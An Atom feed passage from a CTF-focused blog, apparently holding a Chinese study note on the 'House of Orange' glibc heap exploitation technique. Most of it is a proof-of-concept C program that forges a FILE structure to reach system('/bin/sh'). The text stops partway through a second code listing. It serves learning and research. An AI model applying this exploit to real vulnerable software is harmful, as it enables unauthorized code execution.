<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iyheart的博客</title>
  
  <subtitle>分享笔记和学习历程</subtitle>
  <link href="http://iyheart.github.io/atom.xml" rel="self"/>
  
  <link href="http://iyheart.github.io/"/>
  <updated>2025-06-02T02:55:59.215Z</updated>
  <id>http://iyheart.github.io/</id>
  
  <author>
    <name>iyheart</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWN堆house of orange</title>
    <link href="http://iyheart.github.io/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/"/>
    <id>http://iyheart.github.io/2025/06/02/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/</id>
    <published>2025-06-01T17:01:55.000Z</published>
    <updated>2025-06-02T02:55:59.215Z</updated>
    
    <content type="html"><![CDATA[<ul><li>总是感觉自己太焦虑了，是不是自己想太多了，还是喜欢独处，喜欢自己一个人。</li><li>参考文章：<a href="https://www.cnblogs.com/ZIKH26/articles/16712469.html">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 - ZikH26 - 博客园 (cnblogs.com)</a></li></ul><h1 id="相关知识"><a class="markdownIt-Anchor" href="#相关知识"></a> 相关知识</h1><ul><li>house of orange该攻击手法是在没有<code>free</code>函数的情况下，来获得一个在unsorted bin中的堆块。</li><li>漏洞成因的源码位置在<code>malloc.c</code>和<code>arena.c</code>中（glibc2.23）</li><li><code>house of orange</code>这种堆利用手法就已经开始与<code>IO</code>结合在一起了</li></ul><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><h2 id="源码英文"><a class="markdownIt-Anchor" href="#源码英文"></a> 源码(英文)</h2><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><h2 id="源码中文"><a class="markdownIt-Anchor" href="#源码中文"></a> 源码(中文)</h2><ul><li>老样子，翻译一遍源码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 